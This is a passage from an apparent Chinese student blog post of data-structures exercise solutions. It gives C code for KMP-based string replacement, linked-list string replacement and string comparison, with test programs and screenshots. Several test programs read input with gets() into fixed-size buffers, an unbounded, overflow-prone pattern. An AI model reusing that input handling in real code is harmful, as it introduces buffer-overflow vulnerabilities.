class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求模式 next 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(seqstring p,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; p.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">-1</span> || p.str[i] == p.str[j])&#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXSIZE];</span><br><span class="line">    seqstring s,t1,t2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s：&quot;</span>);</span><br><span class="line">    gets(s.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t1：&quot;</span>);</span><br><span class="line">    gets(t1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t2：&quot;</span>);</span><br><span class="line">    gets(t2.str);</span><br><span class="line">    s.length = <span class="built_in">strlen</span>(s.str);</span><br><span class="line">    t1.length = <span class="built_in">strlen</span>(t1.str);</span><br><span class="line">    t2.length = <span class="built_in">strlen</span>(t2.str);</span><br><span class="line">    getnext(t1,next);</span><br><span class="line">    replace(&amp;s,t1,t2,next);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;替换后的结果是：&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s.str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/HVelDLsqSZ78iAB.png" alt="image-20211022190113984"></p><h2 id="3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2"><a href="#3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2" class="headerlink" title="3. 编写一个函数，实现在链式存储方式下字符串的 replace(S,T1,T2)"></a>3. 编写一个函数，实现在链式存储方式下字符串的 <code>replace(S,T1,T2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单链表拷贝函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">copy</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstring L = <span class="literal">NULL</span>,r = <span class="literal">NULL</span>,s,p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        s = (linkstring)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        s-&gt;data = p-&gt;data;</span><br><span class="line">        <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">            L = r = s;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">            r = s;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r!= <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring S,T1,T2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 S：&quot;</span>);</span><br><span class="line">    strcreate(&amp;S); </span><br><span class="line">    print(S);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T1);</span><br><span class="line">    print(T1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T2); </span><br><span class="line">    print(T2);</span><br><span class="line">    S=replace(S,T1,T2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n替换后的结果为：\n&quot;</span>);</span><br><span class="line">    print(S); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/6KrmNXFv4JglMCu.png" alt="image-20211022192220114"></p><h2 id="4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2"><a href="#4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="4. 编写一个函数，实现在 顺序存储方式 下字符串的 strcompare(S1,S2)"></a>4. 编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    seqstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> i,m;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s1：\n&quot;</span>);</span><br><span class="line">    gets(s1.str);</span><br><span class="line">    s1.length=<span class="built_in">strlen</span>(s1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s2：\n&quot;</span>);</span><br><span class="line">    gets(s2.str);</span><br><span class="line">    s2.length = <span class="built_in">strlen</span>(s2.str);</span><br><span class="line">    m = strcompare(s1,s2);</span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">-1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s2 &gt; s1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2\n&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/xDUM8zHKQPw4Vd7.png" alt="image-20211022193108256"></p><h2 id="5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址"><a href="#5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址" class="headerlink" title="5. 已知三维数组 A[3][2][4]，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 A[0][1][2]在 按行优先 和 按列优先 存储方式下的地址"></a>5. 已知三维数组 <code>A[3][2][4]</code>，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 <code>A[0][1][2]</code>在 <code>按行优先</code> 和 <code>按列优先</code> 存储方式下的地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按行优先方式在内存的存储地址为：<span class="number">100</span>+<span class="number">0</span>*<span class="number">8</span>+<span class="number">1</span>*<span class="number">4</span>+<span 